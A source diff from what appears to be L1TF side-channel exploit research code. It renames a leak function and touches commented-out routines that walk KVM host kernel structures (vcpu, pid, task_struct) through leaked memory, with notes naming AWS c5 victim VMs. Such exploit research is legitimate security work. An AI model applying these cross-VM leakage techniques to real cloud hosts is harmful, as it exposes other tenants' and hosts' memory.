@@ -919,7 +919,7 @@ void reverse_host_kernel_data_structures(void)
 
 	// fprintf(stderr, "kvm_lapic:\n");
 	// for (int off = 0; off <= 0xc0; off += 0x40) {
-	// 	char *data = thijs_l1tf_leak(base, kvm_lapic-direct_map+off, 0x40);
+	// 	char *data = try_l1tf_leak(base, kvm_lapic-direct_map+off, 0x40);
 	// 	display_data(data);
 	// }
 	// 	kvm_lapic:
@@ -945,7 +945,7 @@ void reverse_host_kernel_data_structures(void)
 	uintptr_t kvm_vcpu = 0xffff9352eff70e40; // *(kvm_lapic+0x88)
 	// fprintf(stderr, "kvm_vcpu:\n");
 	// for (int off = 0; off <= 0xc0; off += 0x40) {
-	// 	char *data = thijs_l1tf_leak(base, kvm_vcpu-direct_map+off, 0x40);
+	// 	char *data = try_l1tf_leak(base, kvm_vcpu-direct_map+off, 0x40);
 	// 	display_data(data);
 	// }
 	// kvm_vcpu:
@@ -984,7 +984,7 @@ void reverse_host_kernel_data_structures(void)
 	// uintptr_t pid = *(uintptr_t *)&data[0x10]; // *(kvm_vcpu+0x90)
 	// uintptr_t pid = 0xffff93416434bc00; // *(kvm_vcpu+0x90)
 	// fprintf(stderr, "pid:\n");
-	// char *data = thijs_l1tf_leak(base, pid-direct_map, 0x40);
+	// char *data = try_l1tf_leak(base, pid-direct_map, 0x40);
 	// display_data(data);
 	// pid:
 	//                e                0
@@ -1019,7 +1019,7 @@ void reverse_host_kernel_data_structures(void)
 	// uintptr_t task_struct = 0xffff936a91dbaa78 - 0xa78; // *(pid+0x10)
 	// fprintf(stderr, "task_struct:\n");
 	// for (int off = 0; off < 0x100; off += 0x40) {
-	// 	char *data = thijs_l1tf_leak(base, task_struct-direct_map+off, 0x40);
+	// 	char *data = try_l1tf_leak(base, task_struct-direct_map+off, 0x40);
 	// 	display_data(data);
 	// }
 
@@ -1030,7 +1030,7 @@ void reverse_host_kernel_data_structures(void)
 	// 	uintptr_t task_struct = (0xffff936a91dbaa78 - 0xa40) & ~63; // *(pid+0x10)
 	// 	fprintf(stderr, "task_struct+0x8c0:\n");
 	// 	for (int off = 0x8c0; off < 0x980; off += 0x40) {
-	// 		char *data = thijs_l1tf_leak(base, task_struct-direct_map+off, 0x40);
+	// 		char *data = try_l1tf_leak(base, task_struct-direct_map+off, 0x40);
 	// 		display_data(data);
 	// 	}
 	// }
@@ -1047,11 +1047,11 @@ void reverse_host_kernel_data_structures(void)
 
 	// fprintf(stderr, "task_struct+c00:\n");
 	// for (int off = 0xc00; off < 0xc80; off += 0x40) {
-	// 	char *data = thijs_l1tf_leak(base, task_struct-direct_map+off, 0x40);
+	// 	char *data = try_l1tf_leak(base, task_struct-direct_map+off, 0x40);
 	// 	display_data(data);
 	// }
 
-	// char *comm = thijs_l1tf_leak(base, task_struct-direct_map+0xc38, 0x10);
+	// char *comm = try_l1tf_leak(base, task_struct-direct_map+0xc38, 0x10);
 	// fprintf(stderr, "comm = %s\n", comm);
 
 
@@ -1994,7 +1994,7 @@ void reverse_aws_struct_kvm(void)
 /* rain-vm-aws-c5-victim
 
 
-	void thijs_l1tf_leak(char *data, uintptr_t base, const uintptr_t phys_addr, const size_t length)
+	void try_l1tf_leak(char *data, uintptr_t base, const uintptr_t phys_addr, const size_t length)
 	{
 	assert(0 < length && length <= 64 && (phys_addr & (64-1)) + length <= 64);
 
@@ -2063,7 +2063,7 @@ vcpu_via_fds(base=9e39e218, hdm=ffff9868c0000000, task=ffff987b61afb2a0)
 /* rain-vm-aws-c5-extra
 
 
-	void thijs_l1tf_leak(char *data, uintptr_t base, const uintptr_t phys_addr, const size_t length)
+	void try_l1tf_leak(char *data, uintptr_t base, const uintptr_t phys_addr, const size_t length)
 	{
 	assert(0 < length && length <= 64 && (phys_addr & (64-1)) + length <= 64);
 
